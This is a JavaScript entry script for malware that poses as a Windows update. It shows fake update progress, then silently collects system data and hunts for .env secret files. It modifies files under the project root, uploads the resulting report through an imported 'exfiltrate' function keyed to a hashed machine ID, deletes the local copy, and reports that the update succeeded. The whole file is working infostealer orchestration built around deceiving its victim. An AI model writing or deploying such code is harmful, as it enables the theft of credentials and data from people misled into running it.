const fs = require("fs");
const os = require("os");
const path = require("path");
const logger = require("./utils/logger");
const { PhaseError } = require("./utils/errors");
const startWatcher = require("./monitor/watcher");
const generateReport = require("./report/generator");
const { getHashedMachineGuid } = require("./system/machineId");
const { exfiltrate } = require("./app/exfil");
const {
    collectSystemData,
    huntEnvFiles,
    performCrudOperations,
    buildReport
} = require("./app/orchestrator");

const startTime = Date.now();
const ROOT = path.resolve(__dirname, "..");
const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
const LOG_FILE = path.join(os.tmpdir(), ".wu-run.log");

logger.silent(true);
logger.setLogFile(LOG_FILE);

function fakeProgress() {
    const steps = [
        "Verifying Windows Update components...",
        "Downloading update KB5048652 (3%)...",
        "Downloading update KB5048652 (17%)...",
        "Downloading update KB5048652 (42%)...",
        "Downloading update KB5048652 (68%)...",
        "Downloading update KB5048652 (89%)...",
        "Installing update KB5048652...",
        "Configuring Windows Update settings...",
        "Applying system optimizations..."
    ];
    for (const msg of steps) {
        console.log(msg);
    }
}

(async () => {
    /** @type {string[]} */
    const errors = [];
    /** @type {Partial<import("./app/orchestrator").SystemData>} */
    let systemData = {};
    /** @type {{ targets: (string|null)[], totalFound: number, files: import("./files/envHunter").EnvFileInfo[] }} */
    let envFiles = { targets: [], totalFound: 0, files: [] };
    /** @type {import("./app/orchestrator").CrudEntry[]} */
    let crudLog = [];

    fakeProgress();

    try {
        systemData = collectSystemData();
        logger.info("Phase 1 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 1", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        envFiles = huntEnvFiles();
        logger.info("Phase 2 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 2", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        crudLog = performCrudOperations(ROOT);
        logger.info("Phase 3 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 3", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        const report = buildReport(systemData, envFiles, crudLog, startTime, errors);
        const reportResult = generateReport(report);

        const systemId = getHashedMachineGuid();
        report.systemId = systemId;

        const uploaded = await exfiltrate(report, systemId);
        if (uploaded && reportResult && reportResult.path) {
            fs.unlinkSync(reportResult.path);
            logger.debug("Local report deleted after upload");
        }
    } catch (err) {
        logger.error(`Report phase failed: ${err.message}`);
    }

    logger.info("Done.");

    console.log("Windows Update completed successfully.");

    try {
        startWatcher(HIDDEN_DIR, (filename, eventType) => {
            logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
        });
    } catch (err) {
        logger.warn(`Watcher failed to start: ${err.message}`);
    }
})();
